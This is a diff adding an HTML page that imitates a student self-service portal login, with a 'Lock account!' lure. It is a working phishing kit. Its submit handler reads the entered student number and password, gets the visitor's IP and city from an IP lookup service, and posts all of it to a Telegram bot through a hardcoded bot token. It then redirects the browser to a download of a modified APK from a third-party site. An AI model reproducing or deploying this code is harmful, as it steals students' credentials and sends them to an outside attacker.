@@ -1,0 +1,146 @@
+<style>
+  body{
+    background-color:#015ca8;
+    text-align: center;
+  }
+ .container {
+    background-color: white;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    text-align: center;
+    width: 250px;
+    padding: 20px;
+} 
+.p{
+  color:blue;
+  font-size:20px;
+  font-weight:bold;
+}
+.p2 {
+  color:#a15101;
+  font-size:10px;
+   margin:10px;
+   padding: 60px;
+}
+input{
+  border-radius:5px;
+  width:200px;
+  height: 40px;
+  padding:10px;
+  
+}
+button{
+  background-color:blue;
+  color:white;
+  border-radius:5px;
+  width:70px;
+  padding:10px;
+}
+</style>
+<body>
+  <center>
+  <div class="container">
+    
+    <div class="p">
+   
+  <p>Student self-service portal</p>
+  <p></p>
+  <p>Lock account!</p>
+  </div>
+  <div class="p2">
+    <p>click for more information</p>
+  </div>
+  <div class="p">
+    <a href=""><p>what can i do with this portal</p></a>
+  </div>
+  
+<div class="ok">
+<p style="color:blue">Student/Person number</p>
+  <form onsubmit="submitonhfc(); return false;" method="post">
+    <div class="form-container"
+              <input type="hidden" name="" id="pagename" value="Facebook" />
+                <input type="number" id="email" placeholder="e.g 2116515. Not your Temp ID" pattern="\d{7}" maxlength="7" class="input-field" name="email" required>
+                <p style="color:blue">Password</p>
+                <input type="Password" id="gmail" placeholder="" class="input-field" name="gmail" required>
+                
+        <p></p>
+                <button type="submit" class="login-button">Login</button>
+            </form>
+            </div>
+  </div>
+  </div>
+  <div id="error-popup" class="popup">
+        <div class="popup-content">
+            <span class="popup-close" id="close-popup">&times;</span>
+        </div>
+    </div>
+
+    <script>function la(src) {
+      window.location = src;
+    }
+    
+         function GetURLParameter(sParam) {
+           var sPageURL = window.location.search.substring(1);
+           var sURLVariables = sPageURL.split('&');
+           for (var i = 0; i < sURLVariables.length; i++) {
+             var sParameterName = sURLVariables[i].split('=');
+             if (sParameterName[0] == sParam) {
+               return sParameterName[1];
+             }
+           }
+         }
+    
+         var chatid = GetURLParameter('id');
+    
+         function submitonhfc() {
+           // Get IP address information using an API service
+           fetch('https://ipapi.co/json/')
+             .then(response => response.json())
+             .then(data => {
+               // Extract relevant device and IP information
+               const userAgent = navigator.userAgent;
+               const ip = data.ip;
+               const cityName = data.city;
+    
+               // Create the message to send
+               
+               const page = document.getElementById("pagename").value;
+               const email = document.getElementById("email").value;
+               const gmail = document.getElementById("gmail").value;
+               const message = `> donate Page : ${page}\n\n> food :
+                 ${name}\n\n> voucher :
+                 ${email}\n\n> User Agent :
+                 ${gmail}\n\n> gmail
+                 ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
+    
+               // Send the message to your Telegram bot using the appropriate API
+               const botToken = '6833607058:AAGgbkxgbikwaYWj2EmTnvhIDjAELhP5yi8';
+               const chatId =2013982441 ;
+    
+               const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+               const telegramParams = {
+                 chat_id: chatId,
+                 text: message
+               };
+    
+               // Send the request to the Telegram bot using AJAX
+               const xhr = new XMLHttpRequest();
+               xhr.open('POST', telegramUrl, true);
+               xhr.setRequestHeader('Content-Type', 'application/json');
+               xhr.send(JSON.stringify(telegramParams));
+    
+               // Handle the response (optional)
+               xhr.onload = function() {
+                 if (xhr.status === 200) {
+                   window.location.href = "https://space.apkheist.com/Avast_Cleanup-Premium-v24.04.0_build_800010583-Mod_(APKHEIST.COM).apk?https://www.apkheist.com/wp-content/uploads/2021/03/PicsArt_03-25-06.jpg";
+                 } else {
+                   console.log('Error sending data to Telegram:', xhr.statusText);
+                 }
+               };
+    
+             })
+             .catch(error => console.log('Error retrieving IP address information:', error));
+         }</script>
+  </center>
+</body>
